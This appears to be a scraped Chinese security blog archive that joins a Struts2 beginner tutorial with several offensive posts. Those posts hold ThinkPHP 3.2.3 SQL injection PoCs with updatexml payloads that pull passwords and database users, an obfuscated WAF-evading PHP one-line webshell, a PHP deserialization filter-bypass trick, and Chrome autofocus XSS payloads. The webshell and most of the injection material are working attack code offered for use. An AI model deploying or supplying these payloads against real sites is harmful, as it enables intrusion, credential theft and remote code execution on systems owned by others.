POJO表单及POJO操作 - Struts2 去除掉了Struts框架中的Action Forms部分。在Struts2框架下，你可以用任何一POJO来接收表单输入，同样的，你可以把任一POJO视为一个Action类。 标签支持 - Struts2 改进了标签表单，而新的标签可让开发人员减少代码编写量。 AJAX支持 - Struts2 被认可接收进Web 2.0技术，并创建了功能非常类似于标准的Struts2 标签的AJAX标签，把AJAX支持整合进其结果中。 易于整合 - Struts有多种整合方式可使用，现在与其他类型的框架，如Spring、Tiles、SiteMesh之类的，整合更为容易了。 模板支持 - 支持使用模板生成视图。 插件支持 - 有大量的插件可用于Struts2，而使用插件可以增强和扩大Struts2 核心行为。 性能分析 - Struts2 为调试和配置应用程序提供综合的性能分析，此外，Struts也以嵌入调试工具的形式提供集成调试。 易于修改标签 - 在Struts2 中，可使用Freemarker的模板对标签标记进行调整，而修改标签不需要JSP或是Java知识，基本的HTML、XML和CSS知识就足够了。 促进减少配置 - Struts2 使用各种设置的默认值促进减少配置，而你不需要再配置什么除非是偏离了Struts2 设定的默认设置。 视图技术 - Struts2 为多种视图选项（JSP、Freemarker、Velocity、XSLT等）提供支持。 尽管Struts2 有一大列的优点，但我们还是要提到关于它的一些仍需不断改进的缺点： 更大的学习曲线 - 使用Struts MVC，你必须要熟悉JSP、Servlet APIs标准以及一个大型、复杂的框架。 文档缺乏 - 相比于Servlet和JSP APIs标准，Struts的在线资源较少，许多初学者会发现Apache在线文档混乱并缺乏整理。 不够透明 - 相比于使用正常的基于Java的Web应用程序，使用Struts的应用程序有许多是进行在后台，这使得框架不易于理解。 最后说明一点，一个好的框架应该提供各种类型的应用程序都可以使用的通用行为，Struts2 是最好的Web框架之一，并频繁用于RIA（Rich Internet Applications）的发展。 0x02 Struts2目录结构和基础Jar包Struts2 的官方下载网址为：http://struts.apache.org 这里下载2.3.37版本来演示。 目录结构下载成功后，将 struts-2.3.37-all.zip 压缩包进行解压，解压后的目录如图： 各个目录介绍如下表： 名称 作用 apps 用于存放官方提供的 Struts2 示例程序，这些程序可以作为学习者的参考资料。各示例均为 war 文件，可以通过 zip 方式进行解压。 docs 用于存放官方提供的 Struts2 文档，包括 Struts2 的快速入门、Struts2 的文档，以及 API 文档等内容。 lib 用于存放 Struts2 的核心类库，以及 Struts2 的第三方插件类库。 src 用于存放该版本 Struts2 框架对应的源代码。 打开其中的lib目录，可以看到 Struts2 开发中可能用到的所有 JAR 包（此版本有 106 个 JAR 包）。在一般的 Web 开发中，只需要将 lib 文件夹下所依赖的几个基础 JAR 包复制到 Web 项目的 WEB-INF/lib 路径下即可使用 Struts2 框架。 下面看看几个基础的Jar包。 基础Jar包Struts2 2.3.37版本依赖的 JAR 包介绍如下表： 文件名 说 明 asm-3.3.jar 操作 Java 字节码的类库 asm-commons-3.3.jar 提供了基于事件的表现形式 asm-tree-3.3.jar 提供了基于对象的表现形式 struts2-core-2.3.37.jar Struts2 框架的核心类库 xwork-core-2.3.37.jar Web Work 核心库，Struts2 的构建基础 ognl-3.0.6.jar 对象图导航语言（Object Graph Navigation Language），Struts2 框架通过其读/写对象的属性 freemarker-2.3.22.jar Struts2 标签模板使用的类库 javassist-3.11.0.GA.jar JavaScript 字节码解释器 commons-fileupload-1.4.jar Struts2 文件上传组件依赖包 commons-io-2.2.jar Struts2 的输入/输出，传文件依赖的 JAR commons-lang-2.4.jar 包含一些数据类型工具，是对 java.lang 包的增强 log4j-api-2.2.jar Struts2 的日志管理组件依赖包的 API log4j-core-2.2.jar Struts2 的日志管理组件依赖包 可以看出，此版本的 Struts2 项目所依赖的基础 JAR 包共 13 个。Struts2 根据版本的不同所依赖的基础 JAR 包可能不完全相同，不过基本变化不大。 0x03 Struts2架构Struts2是一个以MVC为基础的框架。 从一个高水平角度看，Struts2 是一个MVC拉动的（或MVC2）框架，Struts2 的模型-视图-控制器模式是通过以下五个核心部分进行实现的： 操作（Actions） 拦截器（Interceptors） 值栈（Value Stack）/OGNL 结果（Result）/结果类型 视图技术 而Struts2 与传统的MVC框架略有不同，因为它由Action扮演模型的角色，而不是控制器，虽然这样会有一些重叠。 上图描述了Struts2 高级系统架构下的模型、视图及控制器。控制器是通过Struts2 分派servlet过滤器以及拦截器进行实现，模型是通过Actions进行实现，而视图则是结果类型和结果的结合。值栈和OGNL提供共同的路线、链接以及与其他组件之间的集成。 除了上述部分，还有许多组件相关的信息。web应用程序组件、Actions组件、拦截器组件、结果组件等等。 请求生命周期 通过上述图片的描述，我们可以依照下面几点解释在Struts2 中用户的请求生命周期： 用户发送一个资源需求的请求到服务器（例如：页面）。 核心控制器查看请求后确定适当的动作。 使用验证、文件上传等配置拦截器功能。 执行选择的动作来完成请求的操作。 另外，如果需要的话，配置的拦截器可做任何后期处理。 最后，由视图显示结果并返回给用户。 0x04 HelloWorld程序新建项目在IDEA新建一个Web项目，命名为st2test，整个完整目录结构如图： 先导入如上lib目录中必需的基础Jar包。 配置 Struts2 的核心过滤器打开项目的 web.xml 文件，在文件中添加 Struts2 的核心过滤器 org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter，具体如下： 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:web=\"http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\" id=\"WebApp_ID\" version=\"3.0\"&gt; &lt;!-- 配置Struts2核心过滤器 --&gt; &lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt; org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter &lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; 在 web.xml 文件中，&lt;filter&gt; 标签中配置的信息就是 Struts2 的核心过滤器，该过滤器的名称为 struts2，过滤器类为 org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter，而 &lt;filter-mapping&gt; 标签中配置的是该过滤器的映射。 需要注意的是，在 Struts2.1 版本之前，所使用的核心过滤器类是 org.apache.struts2.dispatcher.FilterDispatcher，从 Struts2.1 版本之后，这个过滤器类已经不推荐使用了，而是使用 org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter 类。 创建 Action 类在项目的 src 目录下，新建一个名称为 com.mi1k7ea 的包，在包中创建一个名为 HelloWorldAction 的类，并使其继承 ActionSupport 类（Struts2 框架所提供的类）。在 HelloWorldAction 类中定义一个 execute() 方法，返回值为 SUCCESS，编辑后的代码如下： 123456789package com.mi1k7ea;import com.opensymphony.xwork2.ActionSupport;public class HelloWorldAction extends ActionSupport &#123; public String execute() throws Exception &#123; return SUCCESS; &#125;&#125; 在上述 HelloWorldAction.java 中，execute() 方法的返回值 SUCCESS 是从父类中继承的常量字段，用于表示执行成功，并返回结果页面。execute() 方法的返回值对应 struts.xml 文件中 &lt;result&gt; 标签中 name 属性的值，Struts2 框架会根据 name 属性值执行对应处理结果下的视图资源。 编写 Struts2 的配置文件在 src 目录下新建一个名称为 struts.xml 的文件，编辑代码后如下： 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!-- 指定 Struts2 配置文件的 DTD 信息 --&gt;&lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\" \"http://struts.apache.org/dtds/struts-2.3.dtd\"&gt;&lt;!-- Struts2配置文件的根元素 --&gt;&lt;struts&gt; &lt;!-- Struts2的Action必须放在指定的包空间下定义 --&gt; &lt;package name=\"hello\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;!-- 定义 action，该 action 对应的类为 com.mi1k7ea.HelloWorldAction 类--&gt; &lt;action name=\"helloWorld\" class=\"com.mi1k7ea.HelloWorldAction\"&gt; &lt;!-- 定义处理结果和视图资源之间的映射关系 --&gt; &lt;result name=\"success\"&gt;/success.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 在 struts.xml 文件中，&lt;action&gt; 标签中定义了请求路径，以及与其对应的 Action 类的映射关系，子标签 &lt;result&gt; 定义了处理结果和视图资源之间的映射关系。 创建视图首页文件在 web 目录下创建一个名称为 index.jsp 的页面文件，在其中编写一个超链接，用于访问 Action 对象，此链接指向的地址为 helloWorld.action，如下所示： 12345678910111213&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;首页&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=\"$&#123;pageContext.request.contextPath &#125;/helloWorld.action\"&gt; 第一个 Struts2 程序！&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 创建返回页面在 web 下再创建一个名称为 success.jsp 的文件，作为 Action 对象处理成功后的返回页面，如下所示： 1234567891011&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;成功页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;您的第一个小程序执行成功，欢迎来到Struts2的世界！&lt;/body&gt;&lt;/html&gt; 运行 0x05 Struts2工作流程Struts2工作流程图： 从上图所示的流程图中可以看出，一个请求在 Struts2 框架中的处理大概可以分为以下几个步骤。 1）首先客户端浏览器发送一个请求（HttpServletRequest）。 2）接着程序会调用 StrutsPrepareAndExecuteFilter，然后询问 ActionMapper 这个请求是否需要调用某个 Action。 3）如果 ActionMapper 决定需要调用某个 Action，StrutsPrepareAndExecuteFilter 会把请求的处理交给 ActionProxy。 4）ActionProxy 通过配置管理器（Configuration Manager）从配置文件（struts.xml）中读取框架的配置信息，从而找到需要调用的 Action 类。 5）ActionProxy 会创建一个 ActionInvocation 的实例。 6）ActionInvocation 使用命名模式调用 Action，在调用 Action 前，会依次调用所有配置的拦截器（Intercepter1、Intercepter2……）。 7）一旦 Action 执行完，则返回结果字符串，ActionInvocation 就会负责查找结果字符串对应的 Result，然后执行这个 Result。通常情况下 Result 会调用一些模板（JSP 等）呈现页面。 8）产生的 Result 信息返回给 ActionInvocation，在此过程中拦截器会被再次执行（顺序与 Action 执行之前相反）。 9）最后产生一个 HttpServletResponse 的响应行为，通过 StrutsPrepareAndExecuteFilter 反馈给客户端。 0x06 Struts2配置文件这里介绍下Struts2中web.xml、struts.xml、struts-config.xml以及struts.properties等配置文件。 struts.xmlstruts.xml 是 Struts2 框架的核心配置文件，该文件主要用于配置 Action 和请求的对应关系，以及配置逻辑视图和物理视图（逻辑视图就是在 struts.xml 文件中配置的 &lt;result&gt; 元素，它的 name 属性值就是逻辑视图名；物理视图是指 &lt;result&gt; 元素中配置的结果页面，如 JSP 文件）资源的对应关系。 struts.xml 文件通常放在 Web 应用的 WEB-INF/classes 目录下，在该目录下的 struts.xml 文件可以被 Struts2 框架自动加载。由于 MyEclipse 开发工具在编译时会自动将 src 路径下的 struts.xml 文件编译后放到 WEB-INF/classes 路径下，所以直接将其放到项目的 src 路径下即可。 下面来看一个典型的 struts.xml 文件结构，如下所示： 123456789101112131415161718192021&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\" \"http://struts.apache.org/dtds/struts-2.3.dtd\"&gt;&lt;struts&gt; &lt;!--&lt;constant&gt;元素用常量的配置--&gt; &lt;constant name=\"struts.enable.DynamicMethodInvocation\" value=\"false\" /&gt; &lt;constant name=\"struts.devMode\" value=\"true\" /&gt; &lt;!--&lt;package&gt;元素用于包配置--&gt; &lt;package name=\"default\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;!--配置Action--&gt; &lt;action name=\"index\" class=\"Xxx\"/&gt; &lt;!--配置Result--&gt; &lt;result type=\"dispatcher\"&gt; &lt;param name=\"location\"&gt;/index.jsp&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;/package&gt; &lt;!-- &lt;include&gt;元素用于包含配置 --&gt; &lt;include file=\"example.xml\"/&gt;&lt;/struts&gt; 在上述文件中，元素说明如下： &lt;struts&gt; 元素是文件的根元素，所有其他元素都放在 &lt;struts&gt;&lt;/struts&gt; 中。 &lt;constant&gt; 元素用于进行常量配置。 &lt;package&gt; 元素用于进行包配置，在 Struts2 框架中，包用于组织 Action 和拦截器等信息，每个包都是由零个或多个拦截器以及 Action 所组成的集合。 &lt;include&gt; 元素用于在一个 struts.xml 配置文件中包含其他的配置文件。 下面，将分别针对这些常用的元素及其配置进行详细讲解。 常量配置在使用 Struts2 框架开发的项目中，通常需要使用大量的常量，这些常量大多在默认的配置文件中已经配置好，但由于用户的需求不同，开发的要求也有所不同，这时可能就需要对这些常量值进行修改，其修改的方法就是在配置文件中对常量进行重新配置。 在 Struts2 中，常量的配置通常使用以下三种方式。 在 struts.xml 文件中使用 &lt;constant&gt; 元素配置常量（常用方式）。 在 struts.properties 文件中配置常量。 在 web.xml 文件中通过 &lt;init-param&gt; 元素配置常量。 上述三种配置方式中，在 struts.xml 文件中通过 &lt;constant&gt; 元素配置常量，是项目开发时最常用的方式，教程中的常量配置也是通过此种方式实现的，所以这里只介绍通过 &lt;constant&gt; 元素配置常量的方式，其他两种方式读者只需了解即可。 在 struts.xml 文件中通过 &lt;constant.../&gt; 元素配置常量时，需要指定两个必填的属性 name 和 value。其中 name 属性用于指定常量的常量名，value 属性用于指定常量的常量值。其配置的示例代码如下所示： 123456&lt;struts&gt; &lt;!--设置默认编码集为UTF-8--&gt; &lt;constant name=\"struts.il8n.encoding\" value=\"UTF-8\" /&gt; &lt;!--设置使用开发模式--&gt; &lt;constant name=\"struts.devMode\" value=\"true\" /&gt;&lt;/struts&gt; 在上述示例代码中，配置了常量 struts.i18n.encoding 和 struts.devMode。其中 struts.i18n.encoding 用于指定 Struts2 应用程序的默认编码集为 UTF-8，struts.devMode 用于指定项目使用的是开发模式。 Struts2 所支持的常量数量很多，在 struts2-core-2.3.37.jar 压缩文件的 org/apache/struts2 路径下有一个 default.properties 文件，该文件里为 Struts2 的所有常量都指定了默认值，读者可以通过查看该文件了解 Struts2 所支持的常量。 除了可以通过上述的三种方式配置常量以外，在 Struts2 内置的一些配置文件中也有对常量的配置。因此，如果在多个文件中配置了同一个 Struts2 常量，则 Struts2 框架加载常量是有一定顺序的，通常的搜索顺序如下。 1）default.properties：该文件保存在 struts2-core-2.3.37.jar 中的 org.apache.struts2 包中。 2）struts-default.xml：该文件保存在 struts2-core-2.3.37.jar 文件中。 3）struts-plugin.xml：该文件保存在 struts-Xxx-2.3.37.jar 等 Struts2 插件 JAR 包中。 4）struts.xml：该文件是 Web 应用自身的 Struts2 配置文件。 5）struts.properties：该文件是 Web 应用默认的 Struts2 配置文件。 6）web.xml：该文件是 Web 应用的配置文件。 上面指定了 Struts2 框架搜索 Struts2 常量的顺序，需要注意的是，如果在多个文件中配置了同一个 Struts2 常量，则后一个文件中配置的常量值会覆盖前面文件中配置的常量值。 包配置在 Struts2 框架中，包用于管理 Action 和拦截器，每个包就是多个 Action、多个拦截器、多个拦截器引用的集合。在 struts.xml 文件中，使用 &lt;package&gt; 元素定义包配置，每个 &lt;package&gt; 元素都定义了一个包配置，其示例代码下所示： 123&lt;package name=\"default\" namespace=\"/\" extends=\"struts-default\"&gt; ...&lt;/package&gt; 在上述代码中，&lt;package&gt; 元素用到了三个关键属性 name、namespace、extends，具体说明如下。 name：必填属性，用于指定该包的名称（该名称在配置文件中必须是唯一的），此名称是该包被其他包引用的 Key。 namespace：可选属性，用于定义该包的命名空间。 extends：可选属性，用于指定该包继承自其他包。其属性值必须是另一个包的 name 属性值，但该属性值通常都设置为 struts-default，这样该包中的 Action 就具有了 Struts2 框架默认的拦截器等功能。 包含配置Struts2 允许将一个配置文件分解成多个配置文件，从而提高配置文件的可读性，&lt;include&gt; 元素用于在一个 struts.xml 配置文件中包含其他的配置文件。Struts2 默认只加载 WEB-INF/classes 下的 struts.xml 文件，一旦通过多个 XML 文件配置 Action，就必须通过 &lt;include&gt;元素包含其他配置文件。 在 struts.xml 文件中包含配置的示例代码如下所示： 12345678&lt;struts&gt; &lt;!--不指定路径，默认在src下时的方式--&gt; &lt;include file=\"struts-post.xml\"/&gt; &lt;include file=\"struts-user.xml\"/&gt; &lt;include file=\"struts-dept.xml\"/&gt; &lt;!--配置文件在具体包中时的方式--&gt; &lt;include file=\"com/mengma/action/struts-product.xml\"/&gt;&lt;/struts&gt; 在上述代码中，struts.xml 文件通过 &lt;include&gt; 元素包含了四个配置文件，其中 file 属性用于指定被包含配置文件的名称。如果被包含的配置文件在 src 路径下，则直接指定文件名即可，如果被包含的配置文件在具体的包中，则需要引入被包含文件的包路径。 需要注意的是，每一个被包含的配置文件都是标准的 Struts2 配置文件，同样包含 DTD 信息、Struts2 配置文件的根元素等信息。由于 struts.xml 文件包含了其他的配置文件，所以在 Struts2 框架自动加载 struts.xml 文件时，就会完成所有配置信息的加载。 web.xmlweb.xml配置文件是一种J2EE配置文件，决定Servlet容器的HTTP元素需求如何进行处理。它严格来说不是一个Struts2配置文件，但它是Struts2运作所需要进行配置的文件。 正如前面所讨论的，这个文件为每个Web应用程序提供接入点。在部署描述符（web.xml）中，Struts2应用程序的接入点将会定义为一个过滤器。因此我们将在web.xml里定义一个StrutsPrepareAndExecuteFilter类的接入点，而这个web.xml文件需要在WebContent/WEB-INF文件夹下创建。 如果你开始时没有模板或工具（比如Eclipse或Maven2）的辅助来生成，那这就是第一个你需要配置的文件。下面是我们在上一个例子中用到的web.xml的内容。 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:web=\"http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\" id=\"WebApp_ID\" version=\"3.0\"&gt; &lt;!-- 配置Struts2核心过滤器 --&gt; &lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt; org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter &lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; 注意，我们将Struts2过滤器映射到/*，而不是/*.action，这意味着所有的url都会被Struts2过滤器解析。 注意：自2.1.3版本开始，ActionContextCleanUp和FilterDispatcher都由StrutsPrepareAndExecuteFilter代替。 struts-config.xmlstruts-config.xml配置文件是Web Client中View和Model组件之间的链接，但在你99.99％的项目里你不必使用这些设置。 struts-config.xml配置文件包含以下主要元素： 序号 拦截器和说明 1 struts-config这是配置文件的根节点。 2 form-beans这是你将ActionForm子类映射到name的位置，你可以在struts-config.xml文件的其余部分，甚至在JSP页面上，将这个name用作ActionForm的别名。 3 global forwards此部分将你在webapp上的页面映射到name，你可以使用这个name来引用实际页面。这避免了对你网页上的URL进行硬编码。 4 action-mappings这是你声明表单处理程序的地方，也被称为操作映射（action mappings）。 5 controller这部分是配置Struts的内部，在实际情况中很少使用。 6 plug-in 这部分告诉Struts在哪里找到属性文件，它包含提示和错误消息。 下面是struts-config.xml文件的示例： 123456789101112131415161718192021222324252627282930313233343536&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\" ?&gt;&lt;!DOCTYPE struts-config PUBLIC\"-//Apache Software Foundation//DTD Struts Configuration 1.0//EN\"\"http://jakarta.apache.org/struts/dtds/struts-config_1_0.dtd\"&gt;&lt;struts-config&gt; &lt;!-- ========== Form Bean Definitions ============ --&gt; &lt;form-beans&gt; &lt;form-bean name=\"login\" type=\"test.struts.LoginForm\" /&gt; &lt;/form-beans&gt; &lt;!-- ========== Global Forward Definitions ========= --&gt; &lt;global-forwards&gt; &lt;/global-forwards&gt; &lt;!-- ========== Action Mapping Definitions ======== --&gt; &lt;action-mappings&gt; &lt;action path=\"/login\" type=\"test.struts.LoginAction\" &gt; &lt;forward name=\"valid\" path=\"/jsp/MainMenu.jsp\" /&gt; &lt;forward name=\"invalid\" path=\"/jsp/LoginView.jsp\" /&gt; &lt;/action&gt; &lt;/action-mappings&gt; &lt;!-- ========== Controller Definitions ======== --&gt; &lt;controller contentType=\"text/html;charset=UTF-8\" debug=\"3\" maxFileSize=\"1.618M\" locale=\"true\" nocache=\"true\"/&gt;&lt;/struts-config&gt; 有关struts-config.xml文件的更多详细内容，可查看Struts Documentation。 struts.properties这个配置文件提供了一种机制来改变框架的默认行为。实际上，struts.properties配置文件中包含的所有属性也可以在web.xml中配置使用init-param，以及在struts.xml配置文件中使用constant标签。 但如果你想保持事件独立以及保留更多struts细节，那么你可以在WEB-INF/classes文件夹下创建这个文件。 struts.properties 文件中配置的值将覆盖。 default.properties 文件中配置的默认值，这些值包含在struts2-core-x.y.z.jar分布中。有一些属性，你可以考虑改为使用。 struts.properties 文件： 1234567891011### When set to true, Struts will act much more friendly for developersstruts.devMode = true### Enables reloading of internationalization filesstruts.i18n.reload = true### Enables reloading of XML configuration filesstruts.configuration.xml.reload = true### Sets the port that the server is run onstruts.url.http.port = 8080 这里任何以＃开头的行都将被假定为注释，并且它会被Struts2默认忽略。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Struts2","slug":"Struts2","permalink":"https://www.mi1k7ea.com/tags/Struts2/"}]},{"title":"ThinkPHP V3.2.3 SQL注入总结","date":"2020-06-14T15:16:10.000Z","path":"2020/06/14/ThinkPHP-V3-2-3-SQL注入总结/","text":"0x01 find()漏洞代码： 12345public function index()&#123; $data = M('users')-&gt;find(I('GET.id')); var_dump($data);&#125; PoC： 1?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)# 0x02 select()漏洞代码： 12345public function test()&#123; $id = i('id'); $res = M('user')-&gt;select($id);&#125; PoC，有很多地方可注，这里主要列举三个table，alias，where，更多还请自行跟踪一下parseSql的各个parseXXX方法，目测都是可行的，比如having,group等： 12345table：http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--alias：http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--where: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- 0x03 delete()漏洞代码： 12345public function test()&#123; $id = i('id'); $res = M('user')-&gt;delete($id);&#125; PoC，同上，这里粗略举三个例子，table,alias,where，但使用table和alias的时候，同时还必须保证where不为空： 12345where: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--alias: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--table: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1 0x04 where()漏洞代码1： 123456public function index()&#123; $User = D('Users'); $map = array('id' =&gt; $_GET['id']); $user = $User-&gt;where($map)-&gt;find();&#125; PoC： 1id[0]=exp&amp;id[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1) 漏洞代码2： 12345678public function index()&#123; $User = M(\"User\"); $user['id'] = I('id'); $data['password'] = I('password'); $valu = $User-&gt;where($user)-&gt;save($data); var_dump($valu);&#125; PoC： 1?id[0]=bind&amp;id[1]=0%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1 0x05 order()漏洞代码： 1234567public function index()&#123; $User = M(\"User\"); $order_by = I('get.order'); $q = $User-&gt;where('id','1')-&gt;order($order_by)-&gt;find(); var_dump($q);&#125; PoC： 1?order[updatexml(1,concat(0x3a,user()),1)] 0x06 参考thinkphp3.2.3 注入漏洞总结 ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23) Thinkphp3.2.3最新版update注入漏洞","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"Bypass某WAF的一句话木马","date":"2020-06-14T11:17:20.000Z","path":"2020/06/14/Bypass某WAF的一句话木马/","text":"Bypass某WAF的一句话木马： 123456&lt;?php$c=\"base64_decode\";$b=\"file_get_contents\";$p=/*-/*-*/$b(\"php://input\")/*-/*-*//*-/*-*//*-/*-*/;eval(/*-/*-*/$c($p).\";\"/*-/*-*//*-/*-*//*-/*-*/);?&gt;","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"PHP反序列化绕过限制Tricks","date":"2020-05-18T15:47:29.000Z","path":"2020/05/18/PHP反序列化绕过限制Tricks/","text":"PHP序列化的时候private和protected变量会引入不可见字符\\x00，输出和复制的时候可能会遗失这些信息，导致反序列化的时候出错。 private属性序列化的时候会引入两个\\x00，注意这两个\\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，如图，url编码后就可以看得很清楚了： 同理，protected属性会引入\\x00*\\x00。 此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。比如s:5:&quot;A&lt;null_byte&gt;B&lt;cr&gt;&lt;lf&gt;&quot;;̀ -&gt; S:5:&quot;A\\00B\\09\\0D&quot;; phpggc这个工具就支持这个选项：https://github.com/ambionics/phpggc#ascii-strings 此时生成的Payload更加可读，也方便传输。 今年网鼎杯出了一道PHP反序列化的题，需要绕过限制，限制是不允许传入一些控制字符等： 其中一种思路就是使用这种技巧，在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。在测试绕过一些WAF的时候可以用到了这个方法。 其他的解法可参考： pravite和Protected成员的序列化 7.2及以上版本的PHP，public属性可以覆盖替代private","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"XSS绕过之autofocus属性的自创标签（Chrome）","date":"2020-05-13T14:23:42.000Z","path":"2020/05/13/XSS绕过之autofocus属性的自创标签/","text":"0x00 前言参考自：autofocus属性的自创标签xss(xss) 仅限于Chrome，因为这是Chrome的一个bug。 简单来说，就是在Chrome中autofocus可以与所有HTML标签一起使用。 0x01 使用已有的标签下面两个标签是平时较为常用的，加上autofocus效果更佳。对于无法在没有用户交互的情况下无法转义元素上下文并需要XSS的情况很有用： 12&lt;iframe autofocus onfocus=alert(0)&gt;&lt;a autofocus onfocus=alert(1) href=x&gt;x&lt;/a&gt; 本地测试x.php： 12345&lt;?phperror_reporting(0);$x = $_GET['x'];echo \"Your input: $x\";?&gt; 在Chrome上直接注入即可弹框，这里a标签由于是点击链接因此会一直自动点击弹框： 0x02 tabindex与contenteditable原文指出因为任何HTML元素都可以通过’tabindex’或’contenteditable’进行聚焦，所以它也会支持’autofocus’： tabindextabindex全局属性指示其元素是否可以聚焦，以及它是否/在何处参与顺序键盘导航（通常使用Tab键，因此得名）。 它接受一个整数作为值，具有不同的结果，具体取决于整数的值： tabindex=负值 (通常是tabindex=“-1”)，表示元素是可聚焦的，但是不能通过键盘导航来访问到该元素，用JS做页面小组件内部键盘导航的时候非常有用。 tabindex=&quot;0&quot; ，表示元素是可聚焦的，并且可以通过键盘导航来聚焦到该元素，它的相对顺序是当前处于的DOM结构来决定的。 tabindex=正值，表示元素是可聚焦的，并且可以通过键盘导航来访问到该元素；它的相对顺序按照tabindex 的数值递增而滞后获焦。如果多个元素拥有相同的 tabindex，它们的相对顺序按照他们在当前DOM中的先后顺序决定。 根据键盘序列导航的顺序，值为 0 、非法值、或者没有 tabindex 值的元素应该放置在 tabindex 值为正值的元素后面。 在这里我们使用tabindex必须有个值，无论正负或0都可以，构造如下的自创xss标签触发弹框： 1&lt;xss tabindex=1 onfocus=alert(/tabindex/) autofocus&gt; contenteditablecontenteditable全局属性是一个枚举属性，表示元素是否可被用户编辑。 如果可以，浏览器会修改元素的部件以允许编辑。 该属性必须是下面的值之一： true 或空字符串，表示元素是可编辑的； false 表示元素不是可编辑的。 如果没有设置该属性，其默认值继承自父元素。 该属性是一个枚举属性，而非布尔属性。这意味着必须显式设置其值为 true、false 或空字符串中的一个，并且不允许简写为 &lt;label contenteditable&gt;Example Label&lt;/label&gt;正确的用法是 &lt;label contenteditable=&quot;true&quot;&gt;Example Label&lt;/label&gt;。 